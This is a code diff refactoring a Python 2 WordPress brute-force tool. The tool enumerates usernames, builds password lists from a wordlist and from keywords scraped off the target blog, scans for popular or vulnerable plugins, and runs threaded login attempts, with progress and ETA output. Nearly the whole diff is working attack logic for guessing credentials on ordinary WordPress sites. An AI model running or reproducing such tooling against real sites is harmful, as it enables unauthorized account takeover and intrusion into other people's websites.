@@ -21,26 +21,7 @@ import logging, logging.config
 import urllib2, urlparse
 import sys, threading, Queue, time, argparse
 
-import config, wplib
-
-class WpbfThread(threading.Thread):
-    """Handle threads that consume the wordlist queue and try to login for each word"""
-    def __init__(self, wordlist_queue):
-        threading.Thread.__init__(self)
-        self._queue = wordlist_queue
-
-    def run(self):
-        while self._queue.qsize() > 0:
-            try:
-                word = self._queue.get()
-                if wp.login(config.username, word):
-                    logger.info("Password '%s' found for username '%s' on %s", word, config.username, wp.get_login_url())
-                    self._queue.queue.clear()
-                self._queue.task_done()
-            except urllib2.HTTPError, e:
-                logger.debug("HTTP Error: %s for: %s", str(e), word)
-                self._queue.put(word)
-                logger.debug("Requeued: %s", word)
+import config, wplib, wpworker
 
 if __name__ == '__main__':
     #parse command line arguments
@@ -48,34 +29,27 @@ if __name__ == '__main__':
     parser.add_argument('url', type=str,  help='base URL where WordPress is installed')
     parser.add_argument('-w', '--wordlist', default=config.wordlist, help="worldlist file (default: "+config.wordlist+")")
     parser.add_argument('-nk', '--nokeywords', action="store_false", help="Don't search keywords in content and add them to the wordlist")
-    parser.add_argument('-u', '--username', default=config.username, help="username (default: "+config.username+")")
+    parser.add_argument('-u', '--username', default=config.username, help="username (default: "+str(config.username)+")")
     parser.add_argument('-s', '--scriptpath', default=config.script_path, help="path to the login form (default: "+config.script_path+")")
     parser.add_argument('-t', '--threads', type=int, default=config.threads, help="how many threads the script will spawn (default: "+str(config.threads)+")")
     parser.add_argument('-p', '--proxy', default=None, help="http proxy (ex: http://localhost:8008/)")
     parser.add_argument('-nf', '--nofingerprint', action="store_false", help="Don't fingerprint WordPress")
     parser.add_argument('-eu', '--enumerateusers', action="store_true", help="Only enumerate users (withouth bruteforcing)")
     parser.add_argument('-eut', '--enumeratetolerance', type=int, default=config.eu_gap_tolerance, help="User ID gap tolerance to use in username enumeration (default: "+str(config.eu_gap_tolerance)+")")
+    parser.add_argument('-pl', '--pluginscan', action="store_true", help="Detect plugins in WordPress using a list of popular/vulnerable plugins")
     parser.add_argument('--test', action="store_true", help="Run python doctests (you can use a dummy URL here)")
     args = parser.parse_args()
     config.wp_base_url = args.url
+    config.wordlist = args.wordlist
+    config.username = args.username
+    config.script_path = args.scriptpath
+    config.threads = args.threads
+    config.proxy = args.proxy
+    config.eu_gap_tolerance = args.enumeratetolerance
     if args.test:
         import doctest
         doctest.testmod(wplib)
         exit(0)
-    if args.wordlist:
-        config.wordlist = args.wordlist
-    if args.username:
-        config.username = args.username
-    if args.enumeratetolerance:
-        config.eu_gap_tolerance = args.enumeratetolerance
-    if args.scriptpath:
-        config.script_path = args.scriptpath
-    if args.threads:
-        config.threads = args.threads
-    if args.proxy:
-        config.proxy = args.proxy
-    else:
-        proxy = None
 
     # logger configuration
     logging.config.fileConfig("logging.conf")
@@ -84,92 +58,96 @@ if __name__ == '__main__':
     # Wp perform actions over a BlogPress blog
     wp = wplib.Wp(config.wp_base_url, config.script_path, config.proxy)
 
-    # build target url
     logger.info("Target URL: %s", wp.get_base_url())
-
-    # enumerate usernames
-    if args.enumerateusers:
-        logger.info("Enumerating users...")
-        logger.info("Usernames: %s", ", ".join(wp.enumerate_usernames(config.eu_gap_tolerance)))
-        exit(0)
-
-    # queue
-    queue = Queue.Queue()
 
     # check URL and username
     logger.info("Checking URL & username...")
+    usernames = []
+    if config.username:
+        usernames.append(config.username)
+
     try:
-        if wp.check_username(config.username) is False:
-            logger.warning("Possible non existent username: %s", config.username)
+        if len(usernames) < 1 or wp.check_username(usernames[0]) is False:
             logger.info("Enumerating users...")
-            enumerated_usernames = wp.enumerate_usernames(config.eu_gap_tolerance)
-            if len(enumerated_usernames) > 0:
-                logger.info("Usernames: %s", ", ".join(enumerated_usernames))
-                config.username = enumerated_usernames[0]
-            if config.username is False:
-                logger.error("Can't find username :(")
-                sys.exit(0)
+            usernames = wp.enumerate_usernames(config.eu_gap_tolerance)
+
+        if len(usernames) > 0:
+            logger.info("Usernames: %s", ", ".join(usernames))
+            if args.enumerateusers:
+                exit(0)
+        else:
+            logger.error("Can't find usernames :(")
     except urllib2.HTTPError:
         logger.error("HTTP Error on: %s", wp.get_login_url())
-        sys.exit(0)
+        exit(0)
     except urllib2.URLError:
         logger.error("URL Error on: %s", wp.get_login_url())
         if config.proxy:
             logger.info("Check if proxy is well configured and running")
-        sys.exit(0)
+        exit(0)
 
-    # check for Login LockDown plugin
+
+    # tasks queue
+    task_queue = Queue.Queue()
+
+    # load fingerprint task into queue
+    if args.nofingerprint:
+        task_queue.put(wpworker.WpTaskFingerprint(config.wp_base_url, config.script_path, config.proxy))
+
+    # load plugin scan tasks into queue
+    if args.pluginscan:
+        plugins_list = [plugin.strip() for plugin in open(config.plugins_list, "r").readlines()]
+        logger.info("%s plugins will be tested", str(len(plugins_list)))
+        for plugin in plugins_list:
+            task_queue.put(wpworker.WpTaskPluginCheck(config.wp_base_url, config.script_path, config.proxy, name=plugin))
+        del plugins_list
+
+    # check for Login LockDown plugin and load login tasks into tasks queue
     logger.debug("Checking for Login LockDown plugin")
     if wp.check_loginlockdown():
         logger.warning("Login LockDown plugin is active, bruteforce will be useless")
-        sys.exit(0)
+    else:
+        # load login check tasks into queue
+        logger.debug("Loading wordlist...")
+        wordlist = [username.strip() for username in usernames]
+        try:
+            [wordlist.append(w.strip()) for w in open(config.wordlist, "r").readlines()]
+        except IOError:
+            logger.error("Can't open '%s' the wordlist will not be used!", config.wordlist)
+        logger.debug("%s words loaded from %s", str(len(wordlist)), config.wordlist)
+        if args.nokeywords:
+            # load into wordlist additional keywords from blog main page
+            wordlist.append(wplib.filter_domain(urlparse.urlparse(wp.get_base_url()).hostname))     # add domain name to the queue
+            [wordlist.append(w.strip()) for w in wp.find_keywords_in_url(config.min_keyword_len, config.min_frequency, config.ignore_with)]
+        logger.info("%s passwords will be tested", str(len(wordlist)*len(usernames)))
+        for username in usernames:
+            for password in wordlist:
+                task_queue.put(wpworker.WpTaskLogin(config.wp_base_url, config.script_path, config.proxy, username=username, password=password, task_queue=task_queue))
+        del wordlist
 
-    # load username into queue
-    if config.username not in queue.queue:
-        queue.put(config.username)
-
-    # load wordlist into queue
-    logger.debug("Loading wordlist...")
-    try:
-        [queue.put(w.strip()) for w in open(config.wordlist, "r").readlines()]
-    except IOError:
-        logger.error("Can't open '%s' the wordlist will not be used!", config.wordlist)
-    logger.debug("%s words loaded from %s", str(queue.qsize()), config.wordlist)
-
-    # load into queue additional keywords from blog main page
-    if args.nokeywords:
-        logger.info("Load into queue additional words using keywords from blog...")
-        queue.put(wplib.filter_domain(urlparse.urlparse(wp.get_base_url()).hostname))     # add domain name to the queue
-        [queue.put(w) for w in wp.find_keywords_in_url(config.min_keyword_len, config.min_frequency, config.ignore_with) ]
-
-    # wordpress version
-    if args.nofingerprint:
-        if wp.fingerprint():
-            logger.info("WordPress version: %s", wp.get_version())
-
-    # spawn threads
-    logger.info("Bruteforcing...")
+    # start workers
+    logger.info("Starting workers...")
     for i in range(config.threads):
-        t = WpbfThread(queue)
+        t = wpworker.WpbfWorker(task_queue)
         t.start()
 
     # feedback to stdout
-    while queue.qsize() > 0:
+    while task_queue.qsize() > 0:
         try:
             # poor ETA implementation
             start_time = time.time()
-            start_queue = queue.qsize()
+            start_queue = task_queue.qsize()
             time.sleep(10)
             delta_time = time.time() - start_time
-            current_queue = queue.qsize()
+            current_queue = task_queue.qsize()
             delta_queue = start_queue - current_queue
             try:
                 wps = delta_time / delta_queue
             except ZeroDivisionError:
                 wps = 0.6
-            print str(current_queue)+" words left / "+str(round(1 / wps, 2))+" passwords per second / "+str( round((wps*current_queue / 60)/60, 2) )+"h left"
+            print str(current_queue)+" tasks left / "+str(round(1 / wps, 2))+" tasks per second / "+str( round(wps*current_queue / 60, 2) )+"min left"
         except KeyboardInterrupt:
             logger.info("Clearing queue and killing threads...")
-            queue.queue.clear()
+            task_queue.queue.clear()
             for t in threading.enumerate()[1:]:
                 t.join()
